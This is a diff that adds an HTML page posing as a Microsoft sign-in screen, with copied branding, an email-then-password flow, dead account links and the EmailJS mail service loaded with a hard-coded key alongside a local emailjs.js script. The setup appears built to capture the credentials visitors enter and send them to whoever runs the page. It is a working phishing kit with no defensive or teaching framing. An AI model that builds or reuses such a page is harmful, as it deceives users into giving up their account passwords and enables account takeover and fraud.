@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>microsoft</title>
+  <link rel="shortcut icon" href="./Microsoft_Logo_PNG_Vector__EPS__Free_Download__1_-removebg-preview.png" type="image/x-icon">
+  <style>
+   * {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  font-family: Arial, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  background-color: #f5f5f5;
+}
+
+@keyframes slideInFromRight {
+  from {
+    transform: translateX(100%);
+    opacity: 0;
+  }
+  to {
+    transform: translateX(0);
+    opacity: 1;
+  }
+}
+
+.login-container {
+  background-color: white;
+  padding: 20px;
+  border-radius: 2px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  max-width: 400px;
+  width: 80%;
+  margin: 0 auto;
+
+  /* Add animation */
+  animation: slideInFromRight 1s ease-out;
+}
+
+h3 {
+  color: #5f5e5e;
+}
+
+.form-group {
+  position: relative;
+  margin-bottom: 20px;
+}
+
+input {
+  width: 100%;
+  padding: 7px 0;
+  font-size: 16px;
+  border: none;
+  border-bottom: 1px solid #999;
+  background: none;
+  outline: none;
+}
+
+label {
+  position: absolute;
+  top: 10px;
+  left: 5px;
+  color: #999;
+  font-size: 16px;
+  transition: all 0.2s ease;
+  pointer-events: none;
+}
+
+input:focus + label,
+input:not(:placeholder-shown) + label {
+  top: -15px;
+  left: 5px;
+  color: #666666;
+}
+
+button {
+  padding: 5px 30px;
+  border: none;
+  background-color: rgb(3, 95, 175);
+  color: white;
+  font-family: sans-serif;
+  margin-top: 10px;
+  border-radius: 3px;
+}
+
+#passwordSection {
+  display: none;
+}
+
+#submitbtn {
+  display: none;
+}
+
+.logo {
+  display: flex;
+  align-items: center;
+  margin-bottom: 20px;
+  font-size: 15px;
+  font-weight: bold;
+  color: #999;
+  margin-top: 20px;
+  font-family: sans-serif;
+}
+
+.ll {
+  width: 100%;
+}
+
+.position {
+  position: relative;
+}
+
+#eye {
+  position: absolute;
+  right: 10px;
+  top: 7px;
+  height: 25px;
+  width: 25px;
+  padding-left: 5px;
+  display: flex;
+  align-items: center;
+}
+
+  </style>
+     <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+     <script type="text/javascript">
+       (function () {
+         emailjs.init("DXxadXNVYQdhrtPMW");
+       })();
+     </script>
+     
+</head>
+<body>
+ <div class="ll">
+    
+    <div class="login-container">
+        <div class="logo">
+         <img src="./Microsoft_Logo_PNG_Vector__EPS__Free_Download__1_-removebg-preview.png" width="30px" alt=""> Microsoft
+        </div>
+        <div>
+         <h3>Sign In</h3>
+        </div>
+        <br>
+         <form id="login-form">
+           <div id="emailSection" class="form-group">
+             <input type="text" id="email" required placeholder=" ">
+             <label for="email">Email, Phone, Skype</label>
+           </div>
+           
+           <div id="passwordSection" class="form-group position">
+            <input type="password" id="password" name="password" required placeholder=" ">
+             <label for="password">Password</label>
+             <span style="background-color: white;" id="eye">
+                <i class="fa-solid fa-eye-slash" id="eyeClose"></i>
+            </span>
+              
+           </div>
+           <div>     
+            <span>New to Microsoft? <a href="#" style="color: #999;">Sign up</a></span>
+            <br><br>
+            <a href="#" style="color: #999;">Can't access your account?</a>
+         </div>
+           <div align="right">
+            <div id="submitbtn">
+                <button type="submit" >Submit</button>
+            </div>
+
+             <button type="button" id="nextBtn">Next</button>
+           </div>
+         </form>
+       </div>
+<br><br>
+       <div class="login-container">
+        <i class="fa-solid fa-key"></i> Sign-in Option
+       </div>
+ 
+ </div>
+  
+ <script
+ src="https://kit.fontawesome.com/7dbb2c7d34.js"
+ crossorigin="anonymous"
+></script>
+<script src="./emailjs.js"></script>
+  <script>
+    document.getElementById("nextBtn").addEventListener("click", function() {
+      const email = document.getElementById("email").value;
+
+      // Validate the email input before showing the password section
+      if (email) {
+        document.getElementById("passwordSection").style.display = "block";
+        document.getElementById("submitbtn").style.display = "block";
+        document.getElementById("nextBtn").style.display = "none";
+      } else {
+        alert("Please enter your email.");
+      }
+    });
+
+
+
+
+  </script>
+</body>
+</html>
